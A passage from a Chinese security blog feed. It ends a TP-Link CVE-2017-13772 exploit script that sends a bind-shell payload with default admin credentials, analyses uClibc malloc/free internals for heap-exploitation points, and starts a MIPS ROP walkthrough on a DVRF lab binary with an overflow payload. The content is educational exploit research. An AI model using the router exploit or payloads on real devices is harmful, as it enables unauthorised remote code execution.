&quot;[+] sending exploit…&quot;</div><div class="line">	print &quot;[+] Wait a couple of seconds before connecting&quot;</div><div class="line">	print &quot;[+] When you are finished do http -r to reset the http service&quot;</div><div class="line"></div><div class="line">	req = urllib2.Request(new_url)</div><div class="line">	req.add_header(&apos;Cookie&apos;, &apos;Authorization=Basic %s&apos; %auth)</div><div class="line">	req.add_header(&apos;Referer&apos;, url + &quot;WanStaticIpV6CfgRpm.htm&quot;)</div><div class="line"></div><div class="line">	resp = urllib2.urlopen(req)</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">	print banner</div><div class="line">	username = &quot;admin&quot;</div><div class="line">	password = &quot;admin&quot;</div><div class="line"></div><div class="line">	(next_url, encoded_string) = login(&quot;192.168.0.1&quot;, username, password)</div><div class="line"></div><div class="line">	###### Both exploits result in the same bind shell ######</div><div class="line">	#first_exploit(data[0], data[1])</div><div class="line">	first_exploit(next_url, encoded_string)</div></pre></td></tr></table></figure>
<p>参考链接：</p>
<p><a href="https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/" target="_blank" rel="external">https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CVE-2017-13772 </tag>
            
            <tag> 路由器实战 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之uClibc中malloc&&free分析]]></title>
      <url>/2017/10/28/step_by_step_pwn_router_part6.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
<hr>
<p>栈溢出告一段落。本文介绍下 <code>uClibc</code> 中的 <code>malloc</code> 和 <code>free</code> 实现。为堆溢出的利用准备基础。<code>uClibc</code> 是 <code>glibc</code> 的一个精简版，主要用于嵌入式设备，比如路由器就基本使用的是 <code>uClibc</code>， 简单自然效率高。所以他和一般的<code>x86</code>的堆分配机制会有些不一样。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>uClibc 的 <code>malloc</code> 有三种实现，分别为：</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509164969446w1f222m1.png?imageslim" alt="paste image"><br>其中 <code>malloc-standard</code> 是最近更新的。它就是把 <code>glibc</code> 的 <code>dlmalloc</code> 移植到了 <code>uClibc</code>中。<code>malloc</code> 是<code>uClibc</code>最开始版本用的 <code>malloc</code>。本文分析的也是<code>malloc</code>目录下的<code>uClibc</code>自己最初实现的 <code>malloc</code>。 因为如果是 <code>malloc-standard</code> 我们可以直接按照 一般 <code>linux</code> 中的堆漏洞相关的利用技巧来利用它。</p>
<p>现在编译 <code>uClibc</code> 的话默认使用的是  <code>malloc-standard</code> ，我也不知道该怎么切换，所以就纯静态看看 <code>malloc</code>目录下的实现了。</p>
<h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><p>从 <code>malloc</code> 的入口开始分析。 为了简单起见删掉了无关代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">//malloc 返回一个指定大小为 __size 的指针。</div><div class="line"></div><div class="line">/*</div><div class="line">调用 malloc 申请空间时，先检查该链表中是否有满足条件的空闲区域节点</div><div class="line">如果没有，则向内核申请内存空间，放入这个链表中，然后再重新在链表中</div><div class="line">查找一次满足条件的空闲区域节点。</div><div class="line"></div><div class="line">它实际上是调用 malloc_from_heap 从空闲区域中申请空间。</div><div class="line"></div><div class="line">*/</div><div class="line"></div><div class="line">void *</div><div class="line">malloc (size_t size)</div><div class="line">&#123;</div><div class="line">  void *mem;</div><div class="line"></div><div class="line"></div><div class="line">  //参数有效性检测。这里没有检测参数为负的情况</div><div class="line"></div><div class="line">  if (unlikely (size == 0))</div><div class="line">    goto oom;</div><div class="line"></div><div class="line"></div><div class="line">  mem = malloc_from_heap (size, &amp;__malloc_heap, &amp;__malloc_heap_lock);</div><div class="line"></div><div class="line">  return mem;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>malloc</code> 实际使用的是 <code>malloc_from_heap</code> 来分配内存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">static void *</div><div class="line">__malloc_from_heap (size_t size, struct heap_free_area **heap</div><div class="line">		)</div><div class="line">&#123;</div><div class="line">  void *mem</div><div class="line"></div><div class="line">  /* 一个 malloc 块的结构如下：</div><div class="line">  </div><div class="line">	  +--------+---------+-------------------+</div><div class="line">	  | SIZE   |(unused) | allocation  ...   |</div><div class="line">	  +--------+---------+-------------------+</div><div class="line">	  ^ BASE			 ^ ADDR</div><div class="line">	  ^ ADDR - MALLOC_ALIGN</div><div class="line">  </div><div class="line">	  申请成功后返回的地址是 ADDR</div><div class="line">	  SIZE 表示块的大小，包括前面的那部分，也就是 MALLOC_HEADER_SIZE</div><div class="line">   */</div><div class="line">  </div><div class="line">  //实际要分配的大小，叫上 header的大小</div><div class="line">  size += MALLOC_HEADER_SIZE;</div><div class="line"></div><div class="line">//加锁</div><div class="line">  __heap_lock (heap_lock);</div><div class="line"></div><div class="line">  /* First try to get memory that&apos;s already in our heap.  */</div><div class="line">  //首先尝试从heap分配内存.这函数见前面的分析</div><div class="line">  mem = __heap_alloc (heap, &amp;size);</div><div class="line"></div><div class="line">  __heap_unlock (heap_lock);</div><div class="line">  </div><div class="line">  /*</div><div class="line">  后面是分配失败的流程，会调用系统调用从操作系统分配内存到 heap, 然后再调用__heap_alloc，进行分配，本文不在分析。</div><div class="line">  */</div></pre></td></tr></table></figure>
<p>计算需要分配内存块的真实大小后进入  <code>__heap_alloc</code> 分配。</p>
<p>在 <code>heap</code>中使用 <code>heap_free_area</code> 来管理空闲内存，它定义在 <code>heap.h</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">/*</div><div class="line"></div><div class="line"></div><div class="line">struct heap_free_area</div><div class="line">&#123;</div><div class="line">	size_t size;  //空闲区的大小</div><div class="line">	 //用于构造循环链表</div><div class="line">	struct heap_free_area *next, *prev;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">size 表示该空闲区域的大小，这个空闲区域的实际地址并没有用指针详细地指明，</div><div class="line">因为它就位于当前 heap_free_area 节点的前面，如下图所示：</div><div class="line"></div><div class="line">+-------------------------------+--------------------+</div><div class="line">|                               |   heap_free_area   |</div><div class="line">+-------------------------------+--------------------+</div><div class="line">\___________ 空闲空间 ___________/\___ 空闲空间信息 ___/</div><div class="line"></div><div class="line"></div><div class="line">实际可用的空闲空间大小为 size – sizeof(struct heap_free_area)</div><div class="line"></div><div class="line">指针 next, prev 分别指向下一个和上一个空间区域，</div><div class="line">所有的空闲区域就是通过许许多多这样的节点链起来的，</div><div class="line">很显然，这样组成的是一个双向链表。</div><div class="line"></div><div class="line">*/</div></pre></td></tr></table></figure></p>
<p>所以 <code>free</code> 块在内存中的存储方式和 <code>glibc</code> 中的存储方式是不一样的。它的元数据在块的末尾，而 <code>glibc</code>中元数据在 块的开头。</p>
<p>下面继续分析 <code>__heap_alloc</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">/* </div><div class="line">   堆heap中分配size字节的内存</div><div class="line">   */</div><div class="line">void *</div><div class="line">__heap_alloc (struct heap_free_area **heap, size_t *size)</div><div class="line">&#123;</div><div class="line">  struct heap_free_area *fa;</div><div class="line">  size_t _size = *size;</div><div class="line">  void *mem = 0;</div><div class="line"></div><div class="line">  /* 根据 HEAP_GRANULARITY 大小向上取整，在 heap.h 中定义 */</div><div class="line"></div><div class="line">  _size = HEAP_ADJUST_SIZE (_size);</div><div class="line">  //如果要分配的内存比FA结构还要小，那就调整它为FA大小</div><div class="line">  </div><div class="line"></div><div class="line">  if (_size &lt; sizeof (struct heap_free_area))</div><div class="line">   </div><div class="line"></div><div class="line"> //根据HEAP_GRANULARITY 对齐 sizeof(double)</div><div class="line">    _size = HEAP_ADJUST_SIZE (sizeof (struct heap_free_area));</div><div class="line"></div><div class="line">	//遍历堆中的FA，找出有合适大小的空闲区,在空闲区域链表中查找大小大于等于 _SIZE 的节点 </div><div class="line">  for (fa = *heap; fa; fa = fa-&gt;next)</div><div class="line">    if (fa-&gt;size &gt;= _size)</div><div class="line">      &#123;</div><div class="line">		/* Found one!  */</div><div class="line">		mem = HEAP_FREE_AREA_START (fa);</div><div class="line">		 //从该空间中分得内存。这函数前面已经分析过了</div><div class="line">		*size = __heap_free_area_alloc (heap, fa, _size);</div><div class="line">		break;</div><div class="line">      &#125;</div><div class="line">  return mem;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>找到<code>大小 &gt;= 请求size</code> 的 <code>heap_free_area</code>，然后进入 <code>__heap_free_area_alloc 分配</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">/* </div><div class="line">   该函数从fa所表示的heap_free_area中，分配size大小的内存</div><div class="line">   */</div><div class="line">static __inline__ size_t</div><div class="line">__heap_free_area_alloc (struct heap_free_area **heap,</div><div class="line">			struct heap_free_area *fa, size_t size)</div><div class="line">&#123;</div><div class="line">  size_t fa_size = fa-&gt;size;</div><div class="line"></div><div class="line">  //如果该空闲区剩余的内存太少。将它全部都分配出去</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">  if (fa_size &lt; size + HEAP_MIN_FREE_AREA_SIZE)</div><div class="line">    &#123;</div><div class="line">    ////将fa从heap中删除</div><div class="line">      __heap_delete (heap, fa);</div><div class="line">      /* Remember that we&apos;ve alloced the whole area.  */</div><div class="line">      size = fa_size;</div><div class="line">    &#125;</div><div class="line">  else</div><div class="line">	  /* 如果这个区域中还有空闲空间，就把 heap_free_area 节点中</div><div class="line">		   的 size 减小 size就可以了：</div><div class="line">	  </div><div class="line">		   分配前：</div><div class="line">		 __________ 空闲空间 __________ 	__ 空闲空间信息 __</div><div class="line">		/							   \ /					\</div><div class="line">		+-------------------------------+--------------------+</div><div class="line">		|								|	heap_free_area	 |</div><div class="line">		+-------------------------------+--------------------+</div><div class="line">		\__________ fa-&gt;size __________/</div><div class="line">	  </div><div class="line">		   分配后：</div><div class="line">			 ___ 已分配 __	  __ 空闲空间 __   __ 空闲空间信息 __</div><div class="line">		/			  \ /			   \ /					\</div><div class="line">		+-------------------------------+--------------------+</div><div class="line">		|			   |				|	heap_free_area	 |</div><div class="line">		+-------------------------------+--------------------+</div><div class="line">		\____ size ___/ \__ fa-&gt;size __/</div><div class="line">	  </div><div class="line">		*/</div><div class="line"></div><div class="line">    fa-&gt;size = fa_size - size;</div><div class="line"></div><div class="line">  return size;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>注释很清晰了。所以如果我们有一个堆溢出，我们就需要覆盖到下面空闲空间的 <code>heap_free_area</code> 中的 指针，才能实现 <code>uClibc</code> 中的 <code>unlink</code> 攻击（当然还要其他条件的配合）,另外我们也知道了在 <code>malloc</code> 的时候，找到合适的 <code>heap_free_area</code>  后，只需要修改 <code>heap_free_area</code> 的 size位就可以实现了分配，所以在 <code>malloc</code> 中是无法 触发类似 <code>unlink</code> 的攻击的。</p>
<p>下面进入 <code>free</code></p>
<h4 id="Free"><a href="#Free" class="headerlink" title="Free"></a>Free</h4><p>首先看 free 函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">void</div><div class="line">free (void *mem)</div><div class="line">&#123;</div><div class="line">  free_to_heap (mem, &amp;__malloc_heap, &amp;__malloc_heap_lock);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>直接调用了 <code>free_to_heap</code> 函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">static void</div><div class="line">__free_to_heap (void *mem, struct heap_free_area **heap)</div><div class="line">&#123;</div><div class="line">  size_t size;</div><div class="line">  struct heap_free_area *fa;</div><div class="line">   /* 检查 mem 是否合法 */</div><div class="line">  if (unlikely (! mem))</div><div class="line">    return;</div><div class="line">/* 获取 mem 指向的 malloc 块的的实际大小和起始地址 */</div><div class="line">  size = MALLOC_SIZE (mem); //获取块的真实大小</div><div class="line">  mem = MALLOC_BASE (mem); //获取块的基地址</div><div class="line">  __heap_lock (heap_lock); //加锁</div><div class="line">  /* 把 mem 指向的空间放到 heap 中  */</div><div class="line">  fa = __heap_free (heap, mem, size);</div><div class="line"></div><div class="line"> //如果FA中的空闲区超过  MALLOC_UNMAP_THRESHOLD。就要进行内存回收了,涉及 brk, 看不懂，就不说了，感觉和利用也没啥关系。</div></pre></td></tr></table></figure>
<p>首先获得了 内存块的起始地址和大小，然后调用 <code>__heap_free</code> 把要 <code>free</code> 的内存放到 <code>heap</code> 中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">/*</div><div class="line">语义上的理解是释放掉从mem开始的size大小的内存。换句话说，就是把从从mem开始的，size大小的内存段，映射回heap。</div><div class="line">*/</div><div class="line">struct heap_free_area *</div><div class="line">__heap_free (struct heap_free_area **heap, void *mem, size_t size)</div><div class="line">&#123;</div><div class="line">  struct heap_free_area *fa, *prev_fa;</div><div class="line">  </div><div class="line">  //拿到 mem的 结束地址</div><div class="line">  void *end = (char *)mem + size;</div><div class="line"></div><div class="line"></div><div class="line">  /* 空闲区域链表是按照地址从小到大排列的，这个循环是为了找到 mem 应该插入的位置 */</div><div class="line">  for (prev_fa = 0, fa = *heap; fa; prev_fa = fa, fa = fa-&gt;next)</div><div class="line">    if (unlikely (HEAP_FREE_AREA_END (fa) &gt;= mem))</div><div class="line">      break;</div><div class="line"></div><div class="line">  if (fa &amp;&amp; HEAP_FREE_AREA_START (fa) &lt;= end)</div><div class="line">   //这里是相邻的情况,不可能小于，所以进入这的就是 HEAP_FREE_AREA_START (fa) == end, 则 mem, 和 fa所表示的内存块相邻</div><div class="line">    &#123;</div><div class="line">    /* </div><div class="line">		如果 fa 和 mem 是连续的，那么将 mem 空间并入 fa 节点（增加fa的大小即可）管理, 如图所示，地址从左至右依次增大</div><div class="line">	</div><div class="line">		  +---------------+--------------+---------------+</div><div class="line">		  | 	  |prev_fa| 	 mem	 |fa_chunk| fa   |</div><div class="line">		  +---------------+--------------+---------------+</div><div class="line">						  ^______________________________^ </div><div class="line">	</div><div class="line">		prev_fa 与 fa 的链接关系不变，只要更改 fa 中的 size 就可以了</div><div class="line">	   */</div><div class="line"></div><div class="line">      size_t fa_size = fa-&gt;size + size;</div><div class="line">      if (HEAP_FREE_AREA_START (fa) == end)</div><div class="line">	&#123;</div><div class="line">	  if (prev_fa &amp;&amp; mem == HEAP_FREE_AREA_END (prev_fa))</div><div class="line">	    &#123;</div><div class="line"></div><div class="line">		 /* 如果 fa 前一个节点和 mem 是连续的，那么将 fa 前一个节点的空间</div><div class="line">			     也并入 fa 节点管理</div><div class="line"></div><div class="line">			   +---------------+---------------+--------------+---------------+</div><div class="line">			   |       |pre2_fa|       |prev_fa|      mem     |       |   fa  |</div><div class="line">			   +---------------+---------------+--------------+---------------+</div><div class="line">		                       ^______________________________________________^</div><div class="line"></div><div class="line">			    将 prev_fa 从链表中移出，同时修改 fa 中的 size</div><div class="line">          */</div><div class="line">	      fa_size += prev_fa-&gt;size;</div><div class="line">	      __heap_link_free_area_after (heap, fa, prev_fa-&gt;prev);</div><div class="line">	    &#125;</div><div class="line">	&#125;</div><div class="line">      else</div><div class="line">	&#123;</div><div class="line">	  struct heap_free_area *next_fa = fa-&gt;next;</div><div class="line"></div><div class="line">	   /* 如果 mem 与 next_fa 是连续的，将 mem 并入 next_fa 节点管理</div><div class="line"></div><div class="line"> 	   +---------------+--------------+--------------+---------------+</div><div class="line">	   |       |prev_fa|      |   fa  |      mem     |       |next_fa|</div><div class="line">	   +---------------+--------------+--------------+---------------+</div><div class="line">                       ^_____________________________________________^ </div><div class="line"></div><div class="line">	   将 fa 从链表中移出，同时修改 next_fa 中的 size</div><div class="line">	  */</div><div class="line">	  if (next_fa &amp;&amp; end == HEAP_FREE_AREA_START (next_fa))</div><div class="line">	    &#123;</div><div class="line">	      fa_size += next_fa-&gt;size;</div><div class="line">	      __heap_link_free_area_after (heap, next_fa, prev_fa);</div><div class="line">	      fa = next_fa;</div><div class="line">	    &#125;</div><div class="line">	  else</div><div class="line">	    /* FA can&apos;t be merged; move the descriptor for it to the tail-end</div><div class="line">	       of the memory block.  */</div><div class="line"></div><div class="line"></div><div class="line">	      /* 如果 mem 与 next_fa 不连续，将 fa 结点移到 mem 尾部</div><div class="line"></div><div class="line"> 	   +---------------+--------------+--------------+---------------+</div><div class="line">	   |       |prev_fa|      |   fa  | mem | unused |       |next_fa|</div><div class="line">	   +---------------+--------------+--------------+---------------+</div><div class="line">                          ^___________________^^________________________^</div><div class="line"></div><div class="line">	       需要重新链接 fa 与 prev_fa 和 next_fa 的关系</div><div class="line">            */</div><div class="line">	    &#123;</div><div class="line">	      /* The new descriptor is at the end of the extended block,</div><div class="line">		 SIZE bytes later than the old descriptor.  */</div><div class="line">	      fa = (struct heap_free_area *)((char *)fa + size);</div><div class="line">	      /* Update links with the neighbors in the list.  */</div><div class="line">	      __heap_link_free_area (heap, fa, prev_fa, next_fa);</div><div class="line">	    &#125;</div><div class="line">	&#125;</div><div class="line">      fa-&gt;size = fa_size;</div><div class="line">    &#125;</div><div class="line">  else</div><div class="line">     /* 如果fa和 mem之间有空隙或者 mem&gt; HEAP_FREE_AREA_END (fa)，那么可以简单地</div><div class="line">       把 mem 插入 prev_fa 和 fa之间 */</div><div class="line">    fa = __heap_add_free_area (heap, mem, size, prev_fa, fa);</div><div class="line"></div><div class="line">  return fa;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>__heap_link_free_area</code> 就是简单的链表操作。没有什么用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">static __inline__ void</div><div class="line">__heap_link_free_area (struct heap_free_area **heap, struct heap_free_area *fa,</div><div class="line">		       struct heap_free_area *prev,</div><div class="line">		       struct heap_free_area *next)</div><div class="line">&#123;</div><div class="line">  fa-&gt;next = next;</div><div class="line">  fa-&gt;prev = prev;</div><div class="line"></div><div class="line">  if (prev)</div><div class="line">    prev-&gt;next = fa;</div><div class="line">  else</div><div class="line">    *heap = fa;</div><div class="line">  if (next)</div><div class="line">    next-&gt;prev = fa;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>感觉唯一可能的利用点在于,前后相邻的情况，需要先把 <code>prev_fa</code> 拆链表，我们如果可以伪造 <code>prev_fa-&gt;prev</code>，就可以得到一次内存写的机会，不过也只能写入 <code>fa</code> 的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fa_size += prev_fa-&gt;size;</div><div class="line">__heap_link_free_area_after (heap, fa, prev_fa-&gt;prev);</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">static __inline__ void</div><div class="line">__heap_link_free_area_after (struct heap_free_area **heap,</div><div class="line">			     struct heap_free_area *fa,</div><div class="line">			     struct heap_free_area *prev)</div><div class="line">&#123;</div><div class="line">  if (prev)</div><div class="line">    prev-&gt;next = fa;</div><div class="line">  else</div><div class="line">    *heap = fa;</div><div class="line">  fa-&gt;prev = prev;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>怎么感觉没有可利用的点，还是太菜了。以后如果遇到实例一定要补充进来。</p>
<p>tips:</p>
<ul>
<li><p>分析库源码时看不太懂可以先编译出来，然后配合这 <code>ida</code> 看，所以要编译成 <code>x86</code> 或者 <code>arm</code> 方便 <code>f5</code> 对照看。比如这次，我把 <code>uClibc</code> 编译成 <code>arm</code> 版后，使用 <code>ida</code> 一看，发现 <code>uClibc</code> 怎么使用的是 <code>glibc</code> 的那一套，一看源码目录发现，原来它已经切换到 <code>glibc</code> 这了。</p>
</li>
<li><p>忽然想起来交叉编译环境感觉可以用 docker 部署，网上一搜发现一大把，瞬间爆炸。</p>
</li>
</ul>
<p>参考链接：</p>
<p><a href="http://blog.chinaunix.net/uid-20543183-id-1930765.html" target="_blank" rel="external">http://blog.chinaunix.net/uid-20543183-id-1930765.html</a></p>
<p><a href="http://hily.me/blog/2007/06/uclibc-malloc-free/" target="_blank" rel="external">http://hily.me/blog/2007/06/uclibc-malloc-free/</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> uclibc源码分析 </tag>
            
            <tag> malloc &amp;&amp; free </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之rop技术实战]]></title>
      <url>/2017/10/28/step_by_step_pwn_router_part4.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
<hr>
<p>这次程序也是 DVRF 里面的，他的路径是 <code>pwnable/ShellCode_Required/stack_bof_02</code> , 同样是一个简单的栈溢出，不过这个程序里面没有提供 <code>getshell</code> 的函数，需要我们执行shellcode来实现。这个正好实战下前文: <a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-26-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%BF%AE%E5%A4%8D-rop%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.html">一步一步pwn路由器之路由器环境修复&amp;&amp;rop技术分析</a>,中分析的在mips下的通用的rop技术。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先使用 <code>qemu</code> 运行目标程序，并等待 <code>gdb</code> 来调试。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/ShellCode_Required/stack_bof_02  &quot;`cat ./pwnable/Intro/input`&quot;</div></pre></td></tr></table></figure></p>
<p>使用pwntools的 cyclic 功能，找到偏移<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15091628511130mev14fe.png?imageslim" alt="paste image"><br>验证一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">payload = &quot;A&quot; * 508 + &apos;B&apos; * 4</div><div class="line"></div><div class="line">with open(&quot;input&quot;, &quot;wb&quot;) as f:</div><div class="line">    f.write(payload)</div></pre></td></tr></table></figure></p>
